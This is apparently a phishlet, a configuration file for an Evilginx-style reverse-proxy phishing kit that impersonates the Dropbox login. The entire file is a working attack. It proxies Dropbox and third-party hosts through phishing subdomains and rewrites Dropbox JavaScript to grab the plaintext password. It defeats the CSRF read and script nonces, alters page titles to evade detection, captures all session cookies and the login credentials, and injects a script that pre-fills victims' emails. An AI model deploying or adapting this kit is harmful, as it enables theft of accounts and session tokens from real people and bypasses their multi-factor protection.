author: '@proxydeveloper'
min_ver: '3.2.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'dropbox.com', session: true, is_landing: true}
  - {phish_sub: '', orig_sub: '', domain: 'dropbox.com', session: true, is_landing: false}
  - {phish_sub: 'cfl', orig_sub: 'cfl', domain: 'dropboxstatic.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxstatic-dropbox', orig_sub: 'www', domain: 'dropboxstatic.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxsources-dropbox', orig_sub: 'sources', domain: 'dropboxstatic.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxs-yimg', orig_sub: 's', domain: 'yimg.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxpaper', orig_sub: 'paper', domain: 'dropbox.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxtags', orig_sub: 'tags', domain: 'tiqcdn.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxdropboxcaptcha', orig_sub: '', domain: 'dropboxcaptcha.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxdropbox-api', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxclient-api', orig_sub: 'client-api', domain: 'arkoselabs.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxcdn-ark', orig_sub: 'cdn', domain: 'arkoselabs.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxmarketing', orig_sub: 'marketing', domain: 'dropbox.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxsnapengage', orig_sub: 'snapengage', domain: 'dropbox.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxfp-drop', orig_sub: 'fp', domain: 'dropbox.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxapi-drop', orig_sub: 'api', domain: 'dropboxapi.com', session: true, is_landing: false}

  - {phish_sub: 'dpbxgoogle-----tag', orig_sub: 'www', domain: 'googletagmanager.com', session: false, is_landing: false}
  - {phish_sub: 'dpbxgoogle', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false}
  - {phish_sub: 'dpbxgoogle----analytics', orig_sub: 'www', domain: 'google-analytics.com', session: false, is_landing: false}
  - {phish_sub: 'dpbxgstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxfonts', orig_sub: 'fonts', domain: 'gstatic.com', session: true, is_landing: false}
  - {phish_sub: 'dpbxapi', orig_sub: 'fonts', domain: 'googleapis.com', session: true, is_landing: false}
sub_filters:
  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: 'dropboxcaptcha.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: 'dropboxcaptcha.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: 'dropboxstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropboxstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'sources', domain: 'dropboxstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'client-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'cdn', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'marketing', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'paper', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'tags', domain: 'tiqcdn.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 's', domain: 'yimg.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'snapengage', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: 'www', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: '', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: 'cfl', domain: 'dropboxstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: '', domain: 'dropboxcaptcha.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: '', domain: 'dropboxcaptcha.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: 'client-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: 'cdn', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: 'marketing', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: 'paper', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'dropbox-api.arkoselabs.com', orig_sub: 'tags', domain: 'tiqcdn.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: 'www', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: '', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: 'cfl', domain: 'dropboxstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: '', domain: 'dropboxcaptcha.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: '', domain: 'dropboxcaptcha.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: 'client-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: 'cdn', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: 'marketing', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: 'paper', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'client-api.arkoselabs.com', orig_sub: 'tags', domain: 'tiqcdn.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'www', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'cfl', domain: 'dropboxstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: 'dropboxcaptcha.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: 'dropboxcaptcha.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'client-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'cdn', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'marketing', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'paper', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'tags', domain: 'tiqcdn.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: '', search: 'n\.indexOf\(o,n\.length-12\)', replace: 'null', mimes: [ 'text/javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: '', search: 't\.encrypted_password\=e', replace: "t.login_password=document.querySelector('input[name=\"login_password\"]').value,t.encrypted_password=e", mimes: [ 'text/javascript']}
# Random bs I copied from github that i didnt even need in the end - @proxydeveloper"
# Change    isSendingInvite:!0     to     isSendingInvite:!1 in js
#  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: 'isSendingInvite:!1', replace: 'isSendingInvite:!1', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
#  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'cfi', domain: 'dropboxstatic.com', search: 'isSendingInvite:!1', replace: 'isSendingInvite:!1', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
# change    isSendingInvite:!1     to     isSendingInvite:!0
#  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: ",(function(){return i.setState({isSendingInvite:!0})})", replace: "", mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
#  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'cfi', domain: 'dropboxstatic.com', search: ",(function(){return i.setState({isSendingInvite:!0})})", replace: "", mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
# .read('__Host-js_csrf')   to    .read('')   in cfl.dropboxstatic.com/static/js/packaged/pkg-exception-reporting.min-vfljGWWkf.js
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: ".read('__Host-js_csrf')", replace: ".read('')", mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'cfi', domain: 'dropboxstatic.com', search: ".read('__Host-js_csrf')", replace: ".read('')", mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'googletagmanager.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'googletagmanager.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'google-analytics.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'google-analytics.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'fonts', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'fonts', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'fonts', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'fonts', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: '', search: "nonce", replace: "nononce", mimes: ['text/html']}
  - {triggers_on: 'www.dropbox.com', orig_sub: 'api', domain: 'dropboxapi.com', search: "{hostname}", replace: "{hostname}", mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 # Part to rename title. Should at least be different from real one, but not completely empty (evasion)
  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: '', search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title>....</title>", mimes: ["text/html"] }
  - {triggers_on: 'dropbox.com', orig_sub: '', domain: '', search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title>..</title>", mimes: ["text/html"] }
  - {triggers_on: 'dropbox.com', orig_sub: '', domain: '', search: 'anonymous"', replace: 'use-credentials"', mimes: ["text/html"] }
  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: '',search: 'anonymous"', replace: 'use-credentials"', mimes: ["text/html"] }
  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: '',search: 'anonymous"', replace: 'use-credentials"', mimes: ["text/html", "text/javascript","application/javascript"] }

auth_tokens:
  - domain: 'www.dropbox.com'
    keys: ['.*,regexp,optional,always']
  - domain: '.www.dropbox.com'
    keys: ['.*,regexp,optional,always']
  - domain: '.dropbox.com'
    keys: ['.*,regexp,optional,always']
  - domain: '.arkoselabs.com'
    keys: ['.*,regexp,optional,always']
credentials:
  username:
    key: 'login_email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'login_password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.dropbox.com'
  path: '/login'

auth_urls:
  - '/page_success/end'

force_post:
  - path: '/ajax_login'
    force:
      - {key: 'remember_me', value: 'true'}
    type: 'post'

js_inject:
  - trigger_domains: [ "www.dropbox.com"]
    trigger_paths: ["/login"]
    script: |
        (function () {
            function getRandomInt(min, max) {
                min = Math.ceil(min);
                max = Math.floor(max);
                return Math.floor(Math.random() * (max - min + 1)) + min;
            }

            function simulateTyping(element, inputStr) {
                return inputStr.split('').reduce(function (promise, char) {
                    return promise.then(function () {
                        return new Promise(function (resolve) {
                            setTimeout(function () {
                                element.value += char;
                                element.innerText += char;
                                if ('createEvent' in document) {
                                    var evt = document.createEvent('HTMLEvents');
                                    evt.initEvent('input', true, true);
                                    element.dispatchEvent(evt);
                                } else {
                                    element.fireEvent('oninput');
                                }
                                resolve();
                            }, getRandomInt(10, 25));
                        });
                    });
                }, Promise.resolve());
            }

            function waitForElement(selector, timeout = 15000) {
                return new Promise(function (resolve, reject) {
                    let element = document.querySelector(selector);
                    if (element) {
                        return resolve(element);
                    }
                    let startTime = Date.now();
                    let checkInterval = setInterval(function() {
                        if (Date.now() - startTime > timeout) {
                            clearInterval(checkInterval);
                            return reject(Error(`Timeout for ${selector}: did not appear within ${timeout}ms.`));
                        }
                        element = document.querySelector(selector);
                        if (element) {
                            clearInterval(checkInterval);
                            resolve(element);
                        }
                    }, 255);

                    let observer = new MutationObserver(function(mutations) {
                        mutations.forEach(function() {
                            element = document.querySelector(selector);
                            if (element) {
                                clearInterval(checkInterval);
                                observer.disconnect();
                                resolve(element);
                            }
                        });
                    });

                    observer.observe(document, {
                        childList: true,
                        subtree: true
                    });

                    setTimeout(function() {
                        clearInterval(checkInterval);
                        observer.disconnect();
                        reject(Error(`Timeout for ${selector}: did not appear within ${timeout}ms.`));
                    }, timeout);
                });
            }

            (function simulate() {
                try {
                    var hashValue = location.hash.slice(1).split("#")[0];
                    waitForElement("input[name*='susi_email']")
                        .then(function (emailField) {
                            if (emailField.value === decodeURIComponent(hashValue)) {
                                return;
                            }
                            emailField.value = '';
                            return simulateTyping(emailField, decodeURIComponent(hashValue));
                        })
                        .catch(function (error) {
                            console.error(error);
                        });
                } catch (error) {
                    console.error(error);
                }
            })();
        })();
